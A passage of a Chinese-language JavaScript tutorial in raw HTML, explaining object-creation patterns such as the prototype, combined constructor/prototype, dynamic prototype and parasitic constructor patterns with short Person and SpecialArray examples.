136);">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = sayName;</span></code></p><p style="white-space: normal;"><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">}</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(0, 0, 136);">function</span> sayName<span class="" style="font-size: 14px; color: rgb(102, 0, 102);">()</span>{</span></code></p><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"> &nbsp; &nbsp;alert(<span class="" style="font-size: 14px; color: rgb(0, 0, 136);">this</span>.name);<br>}</span></code></pre><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样做解决了多个函数解决相同问题的问题，但是有产生了新的问题，在全局作用域中实际上只被某个对象调用，这让全局对象有点名不副实。更让人无法接受的是：如果对象需要定义很多方法，那么就要定义很多全局函数，于是我们这个自定义的引用类型就丝毫没有封装性可言了。好在这些问题可以使用原型模式来解决。</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><br></p><p style="line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(247, 92, 47);"><strong>三、原型模式</strong></span></p><p style="line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="text-align: justify;"><br></span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="text-align: justify; color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们创建的每个函数都有一个<span style="text-align: justify; color: rgb(0, 128, 255);">prototype</span>（原型）属性，这个属性是一个指针，指向一个对象，而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法。使用原型对象的实例就是让所有实例共享它所包含的属性和方法。换句话说，不必在构造函数中定义对象的实例信息，而是可以将这些信息直接添加到原型对象中，如下所示：</span><br></p><section data-role="outer" label="Powered by 135editor.com" style="font-family: 微软雅黑;"><section class="" data-tools="135编辑器" data-id="87859" style="   box-sizing: border-box; "><pre class="" name="code" style=" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; "><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="color: rgb(0, 0, 136);">function</span> Person<span class="" style="color: rgb(102, 0, 102);">()</span>{<br>}<br>Person.prototype.name = <span class="" style="color: rgb(0, 136, 0);">“wei”</span>;<br>Person.prototype.age = <span class="" style="color: rgb(0, 102, 102);">27</span>;<br>Person.prototype.job = <span class="" style="color: rgb(0, 136, 0);">“Software”</span>;<br>Person.prototype.sayName = <span class="" style="color: rgb(0, 0, 136);">function</span><span class="" style="color: rgb(102, 0, 102);">()</span>{<br> &nbsp; &nbsp;<br> &nbsp;alert(<span class="" style="color: rgb(0, 0, 136);">this</span>.name);<br>}<br> <br><span class="" style="color: rgb(0, 0, 136);">var</span> person1 = <span class="" style="color: rgb(0, 0, 136);">new</span> Person();</span></code><p style="white-space: normal;"><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">person1.sayName(); &nbsp; &nbsp; &nbsp;<span class="" style="font-size: 14px; color: rgb(136, 0, 0);">//“wei”</span></span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(0, 0, 136);"><br>var</span> person2 = <span class="" style="font-size: 14px; color: rgb(0, 0, 136);">new</span> Person();</span></code></p><p style="white-space: normal;"><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">person2.sayName(); &nbsp; &nbsp; &nbsp;<span class="" style="font-size: 14px; color: rgb(136, 0, 0);">//“wei”</span></span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><br><span style="font-size: 14px;">alert(person1.sayName == person2.sayName);</span></code></p></pre></section></section></section></section></section></section></section></section></section><section data-role="outer" label="Powered by 135editor.com" style="font-family: 微软雅黑;"><section class="" data-tools="135编辑器" data-id="87859" style="box-sizing: border-box;"><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在此，我们将<span style="color: rgb(0, 128, 255);">sayName()</span>方法和所有的属性直接添加在了<span style="color: rgb(0, 128, 255);">Person</span>的<span style="color: rgb(0, 128, 255);">prototype</span>属性中，构造函数变成了空函数。即便如此，我们仍然可以通过构造函数来创建新对象，而且新对象还会具有相同的属性和方法。但是与构造函数不同的是，新对象的这些属性和方法是由所有实例共享的。换句话说，<span style="color: rgb(0, 128, 255);">person1</span>和<span style="color: rgb(0, 128, 255);">person2</span>访问的都是同一组属性和同一个<span style="color: rgb(0, 128, 255);">sayName()</span>函数。要理解原型模式的工作原理，就必须先理解ECMAScript中原型对象的性质。&nbsp;</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型对象的本性由于篇幅太长将会在下一章节详细分析。上面我们说了原型模式的好处，接下来我们来看一下原型模式的缺点。原型模式省略了为构造函数传递参数的这一环节，结果所有实例在默认情况下都具有相同的属性值。这会在某些程度上带来一种不便，这并不是原型模式最大的问题，因为如果我们想为一个通过原型模式创建的对象添加属性时，添加的这个属性就会屏蔽原型对象的保存的同名属性。换句话说，就是添加的这个属性会阻止我们去访问原型中的属性，但并不会改变原型中的属性。</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型模式最大的问题是由其共享的本质所导致的。原型中所有的属性被很多实例共享，这种共享对函数非常合适，对包含基本值的属性也说的过去，但是对引用类型的属性值来说问题就比较突出了，下面我们来看一个例子：</span></p><pre class="" name="code" style=" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; "><code class="" style=" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="box-sizing: border-box;">function</span> Person(){<br>}<br>Person.prototype = { &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class="" style="box-sizing: border-box; color: rgb(0, 136, 0);">constructor</span>:Person, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class="" style="box-sizing: border-box; color: rgb(0, 136, 0);">name</span>:<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“wei”</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class="" style="box-sizing: border-box; color: rgb(0, 136, 0);">age</span>:<span class="" style="color: rgb(0, 102, 102); box-sizing: border-box;">29</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class="" style="box-sizing: border-box; color: rgb(0, 136, 0);">friends</span>:[<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“乾隆”</span>,<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“康熙”</span>], &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class="" style="box-sizing: border-box; color: rgb(0, 136, 0);">sayName</span>:<span class="" style="box-sizing: border-box;">function</span>(){<br> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">this</span>.name);<br> &nbsp; &nbsp;}<br>}<br><span class="" style="box-sizing: border-box;">var</span> person1 = <span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">new</span> Person();<br><span class="" style="box-sizing: border-box;">var</span> person2 = <span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">new</span> Person();<br>person1.friends.push(<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“嬴政”</span>);<br><span class="" style="color: rgb(102, 0, 102); box-sizing: border-box;">console</span>.log(person1.friends); &nbsp; <span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">//</span>[<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“乾隆”</span>,<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“康熙”</span>,<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“嬴政”</span>]<br><span class="" style="color: rgb(102, 0, 102); box-sizing: border-box;">console</span>.log(person2.friends); &nbsp; <span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">//</span>[<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“乾隆”</span>,<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“康熙”</span>,<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“嬴政”</span>]<br><span class="" style="color: rgb(102, 0, 102); box-sizing: border-box;">console</span>.log(person1.friends === person2.friends); &nbsp; <span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">//</span><span class="" style="color: rgb(0, 102, 102); box-sizing: border-box;">true</span></span></code></pre><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);"></span></p><section data-role="outer" label="Powered by 135editor.com" style="font-family: 微软雅黑;"><section class="" data-tools="135编辑器" data-id="87859" style="   box-sizing: border-box; "><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子中，<span style="color: rgb(0, 128, 255);">Person.prototype</span>对象有一个名为<span style="color: rgb(0, 128, 255);">friends</span>的属性，该属性包含一个字符串数组。然后创建了两个<span style="color: rgb(0, 128, 255);">Person</span>的实例，接着修改<span style="color: rgb(0, 128, 255);">person1.friends</span>引用的数组，向数组中添加一个字符串，由于数组存在于<span style="color: rgb(0, 128, 255);">Person.prototype</span>中而不是<span style="color: rgb(0, 128, 255);">person1</span>中，所以<span style="color: rgb(0, 128, 255);">person2.friends</span>也会被修改。但是一般每个对象都是要有属于自己的属性的，所以我们很少看到有人单独使用原型模式来创建对象。</p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><br></p></section></section><p style="line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(247, 92, 47);"><strong>四、组合使用构造函数模式和原型模式</strong></span><span style="color: rgb(136, 136, 136);"></span><br></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><br></p><section data-role="outer" label="Powered by 135editor.com" style="font-family: 微软雅黑;"><section class="" data-tools="135编辑器" data-id="87859" style="   box-sizing: border-box; "><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义类型最常见的方式就是组合使用构造函数模式与原型模式。构造函数模式用于定义实例属性，原型模式用于定义方法和共享的属性。结果，每个实例都会有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度的节省了内存。另外，这种混成模式还支持向构造函数传递参数；可谓是集两种模式之长。下面的代码重写了前面的例子：</span></p></section></section><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);"></span></p><section data-role="outer" label="Powered by 135editor.com" style="font-family: 微软雅黑;"><section class="" data-tools="135编辑器" data-id="87859" style="   box-sizing: border-box; "><pre class="" name="code" style=" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; "><p style="white-space: normal;"><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">function Person(name, age){ &nbsp; &nbsp;</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(0, 0, 136);">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(0, 0, 136);">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(0, 0, 136);">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class="" style="font-size: 14px; color: rgb(0, 136, 0);">“乾隆”</span>,<span class="" style="font-size: 14px; color: rgb(0, 136, 0);">“康熙”</span>];</span></code></p><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">}</span></code><p style="white-space: normal;"><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">Person.prototype = { &nbsp; &nbsp;</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(0, 136, 0);">&nbsp;&nbsp;&nbsp;&nbsp;constructor</span>:Person, &nbsp; &nbsp;</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(0, 136, 0);">&nbsp;&nbsp;&nbsp;&nbsp;sayName</span>:function(){</span></code></p><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class="" style="font-size: 14px; color: rgb(0, 0, 136);">this</span>.name);<br> &nbsp; &nbsp;}</span></code><p style="white-space: normal;"><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">}</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">var person1 = <span class="" style="font-size: 14px; color: rgb(0, 0, 136);">new</span> Person(<span class="" style="font-size: 14px; color: rgb(0, 136, 0);">“wei”</span>,<span class="" style="font-size: 14px; color: rgb(0, 102, 102);">29</span>);</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">var person2 = <span class="" style="font-size: 14px; color: rgb(0, 0, 136);">new</span> Person(<span class="" style="font-size: 14px; color: rgb(0, 136, 0);">“bu”</span>,<span class="" style="font-size: 14px; color: rgb(0, 102, 102);">25</span>);</span></code></p><p style="white-space: normal;"><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">person1.friends.push(<span class="" style="font-size: 14px; color: rgb(0, 136, 0);">“嬴政”</span>);</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(102, 0, 102);">console</span>.log(person1.friends); &nbsp; <span class="" style="font-size: 14px; color: rgb(0, 136, 0);">//</span>[<span class="" style="font-size: 14px; color: rgb(0, 136, 0);">“乾隆”</span>, <span class="" style="font-size: 14px; color: rgb(0, 136, 0);">“康熙”</span>, <span class="" style="font-size: 14px; color: rgb(0, 136, 0);">“嬴政”</span>]</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(102, 0, 102);">console</span>.log(person2.friends); &nbsp; <span class="" style="font-size: 14px; color: rgb(0, 136, 0);">//</span>[<span class="" style="font-size: 14px; color: rgb(0, 136, 0);">“乾隆”</span>, <span class="" style="font-size: 14px; color: rgb(0, 136, 0);">“康熙”</span>]</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(102, 0, 102);">console</span>.log(person1.friends === person2.friends); &nbsp; <span class="" style="font-size: 14px; color: rgb(0, 136, 0);">//</span><span class="" style="font-size: 14px; color: rgb(0, 102, 102);">false</span></span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(102, 0, 102);">console</span>.log(person1.sayName === person2.sayName); &nbsp; <span class="" style="font-size: 14px; color: rgb(0, 136, 0);">//</span><span class="" style="font-size: 14px; color: rgb(0, 102, 102);">true</span></span></code></p></pre></section></section><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，实例属性都是在构造函数中定义的，而由所有实例共享的属性<span style="color: rgb(0, 128, 255);">constructor</span>和方法<span style="color: rgb(0, 128, 255);">sayName()</span>则是在原型中定义的。所以修改了<span style="color: rgb(0, 128, 255);">person1.friends</span>并不会改变<span style="color: rgb(0, 128, 255);">person2.friends</span>，因为他们分别引用了不同的数组。</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种构造函数与原型模式混成的模式，是目前在ECMAScript中使用最广泛、认同度最高的一种创建自定义类型的方法。可以说，这是用来定义引用的一种默认形式。</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);"><br></span></p><p style="line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(247, 92, 47);"><strong>五、动态原型模式</strong></span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);"><br></span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有其他OO语言经验的开发人员在看到独立的构造函数和原型时，很可能会感到非常的困惑。动态原型模式就是用来解决这个问题的一个方案，它把所有的信息都封装在了构造函数中，而通过构造函数中初始化原型（仅在必要的情况下），又保持了同时使用构造函数和原型的优点。换句话说，可以通过检查某个应该存在的方法是否有效，来决定是否要初始化原型。来看一个例子：</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);"></span></p><section data-role="outer" label="Powered by 135editor.com" style="font-family: 微软雅黑;"><pre class="" name="code" style=" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; "><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="color: rgb(0, 0, 136);">function</span> Person<span class="" style="color: rgb(102, 0, 102);">(name, age)</span>{</span></code><p style="white-space: normal;"><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(0, 0, 136);">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(0, 0, 136);">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(0, 0, 136);">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class="" style="font-size: 14px; color: rgb(0, 136, 0);">“乾隆”</span>,<span class="" style="font-size: 14px; color: rgb(0, 136, 0);">“康熙”</span>]; &nbsp; &nbsp;<span class="" style="font-size: 14px; color: rgb(136, 0, 0);">//注意if语句</span></span></code></p><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;<span class="" style="font-size: 14px; color: rgb(0, 0, 136);">if</span>(<span class="" style="font-size: 14px; color: rgb(0, 0, 136);">typeof</span> <span class="" style="font-size: 14px; color: rgb(0, 0, 136);">this</span>.sayName!=<span class="" style="font-size: 14px; color: rgb(0, 136, 0);">“function”</span>){<br>&nbsp;&nbsp;&nbsp;&nbsp;Person.prototype.sayName = <span class="" style="font-size: 14px; color: rgb(0, 0, 136);">function</span><span class="" style="font-size: 14px; color: rgb(102, 0, 102);">()</span>{ <br>&nbsp;&nbsp;&nbsp;&nbsp;alert(<span class="" style="font-size: 14px; color: rgb(0, 0, 136);">this</span>.name);<br> &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;}</span></code><p style="white-space: normal;"><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">}</span></code><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="font-size: 14px; color: rgb(0, 0, 136);">var</span> person1 = <span class="" style="font-size: 14px; color: rgb(0, 0, 136);">new</span> Person(<span class="" style="font-size: 14px; color: rgb(0, 136, 0);">“wei”</span>,<span class="" style="font-size: 14px; color: rgb(0, 102, 102);">29</span>);</span></code></p><code class="" style=" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; "><span style="font-size: 14px;">person1.friends.push(<span class="" style="font-size: 14px; color: rgb(0, 136, 0);">“嬴政”</span>);<br>person1.sayName();</span></code></pre></section><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意构造函数代码中的if语句，这里只在<span style="color: rgb(0, 128, 255);">sayName()</span>方法不存在的情况下才会将它添加到原型中。这断代码只有在第一次调用构造函数的时候才会被执行。此后，原型已经被初始化，不需要再做什么修改。不过要记住，这里所做的修改能立即在所有实例中得到反映。因此，这种方法可以说确实非常完美。其中if语句检查的是初始化之后应该存在的任何方法和属性–不必再用一大堆if来检查每个属性和方法，只检查其中一个即可。对于采用这样模式创建的对象，还可以使用<span style="color: rgb(0, 128, 255);">instanceof</span>操作符来确定他的类型。</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(247, 92, 47);"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：使用动态原型模式时，不能使用对象字面量重写原型。如果在已经创建了实例的情况下重写原型，那么就会切断现有的实例与新原型之间的联系。</strong></span><span style="color: rgb(136, 136, 136);"><br></span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><br></p><p style="line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><strong><span style="color: rgb(247, 92, 47);">六、寄生构造函数模式</span></strong></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><br></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，在上述几种模式都不适合的情况下可以使用寄生构造函数模式。这种模式的基本思想是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后再返回新创建的对象，但从表面看，这个函数又很像典型的构造函数。来看一个例子：</span></p><pre class="" name="code" style=" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; "><code class="" style=" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="box-sizing: border-box;"><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">function</span> <span class="" style="box-sizing: border-box;">Person</span><span class="" style="color: rgb(102, 0, 102); box-sizing: border-box;">(name, age, job)</span>{</span><br><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">&nbsp; var</span> o = <span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">new</span> <span class="" style="color: rgb(102, 0, 102); box-sizing: border-box;">Object</span>();<br>&nbsp; o.name = name;<br>&nbsp; o.age = age;<br> &nbsp; &nbsp;<br>&nbsp; o.job = job;<br> &nbsp; &nbsp;<br>&nbsp; o.sayName = <span class="" style="box-sizing: border-box;"><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">function</span><span class="" style="color: rgb(102, 0, 102); box-sizing: border-box;">()</span>{</span><br>&nbsp; alert(<span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">this</span>.name);<br> &nbsp; &nbsp;} &nbsp; &nbsp;<br><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;"> &nbsp; &nbsp; &nbsp;return</span> o;<br>}<br><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">var</span> person = <span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">new</span> Person(<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“wei”</span>,<span class="" style="color: rgb(0, 102, 102); box-sizing: border-box;">29</span>,<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“banzhuan”</span>);<br>person.sayName(); &nbsp; <span class="" style="color: rgb(136, 0, 0); box-sizing: border-box;">//“wei”</span></span></code></pre><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style="color: rgb(0, 128, 255);">Person</span>函数创建了一个对象，并以相应的属性和方法初始化该对象，然后返回了这个对象。除了使用<span style="color: rgb(0, 128, 255);">new</span>操作符把使用的包装函数叫做构造函数之外，这个模式和工厂模式并没有多大的区别。构造函数在不返回值的情况下，会默认返回新对象的实例。而通过在构造函数的末尾添加一个<span style="color: rgb(0, 128, 255);">return</span>语句，可以重写调用构造函数时返回的值。</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个模式可以在特殊的情况下来为对象创建构造函数。假设我们想创建一个具有额外方法的特殊数组。由于不能直接修改Array构造函数，因此可以使用这个模式：</span></p><pre class="" name="code" style=" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; "><code class="" style=" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="box-sizing: border-box;"><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">function</span> <span class="" style="box-sizing: border-box;">SpecialArray</span><span class="" style="color: rgb(102, 0, 102); box-sizing: border-box;">()</span>{</span><span class="" style="color: rgb(136, 0, 0); box-sizing: border-box;"><br> &nbsp; &nbsp;//创建数组</span><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;"><br> &nbsp; &nbsp;var</span> values = <span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">new</span> <span class="" style="color: rgb(102, 0, 102); box-sizing: border-box;">Array</span>(); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class="" style="color: rgb(136, 0, 0); box-sizing: border-box;">//添加值</span><br> &nbsp; &nbsp;values.push.apply(values,<span class="" style="color: rgb(102, 0, 102); box-sizing: border-box;">arguments</span>); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> 